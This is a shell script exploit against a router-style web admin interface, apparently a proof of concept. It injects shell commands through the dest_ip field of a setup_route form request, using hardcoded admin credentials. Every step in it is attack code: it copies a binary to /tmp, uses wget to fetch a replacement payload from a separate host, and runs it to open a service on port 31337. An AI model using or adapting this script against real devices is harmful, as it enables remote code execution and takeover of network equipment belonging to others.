#!/bin/sh

TARGET="192.168.10.1"
EXTBIN_URL="http://192.168.10.101:8080/extbin"

function inject
{
  echo 'ShellInject: '$2
#echo 'dest_ip=;'"$2"';#&dest_mask=255.255.255.0&todo=add&gate_ip=1.1.1.1&page_type=route_table.asp&route_index=0&=menu_flag=255'
  curl --user admin:hackme --basic --data 'dest_ip=;'"$2"';#&dest_mask=255.255.255.0&todo=add&gate_ip=1.1.1.1&page_type=route_table.asp&route_index=0&=menu_flag=255' http://$1/goform/setup_route 2> /dev/null > /dev/null
}

# Target system does not have chmod. :(
echo "Target system does not have chmod. :("
inject $TARGET "cp /bin/webs /tmp/extbin"
echo "Downloading shellinject demo..."
inject $TARGET "wget -O /tmp/extbin "$EXTBIN_URL
echo "Web server started! Please connect to http://"$TARGET":31337"
inject $TARGET "/tmp/extbin"
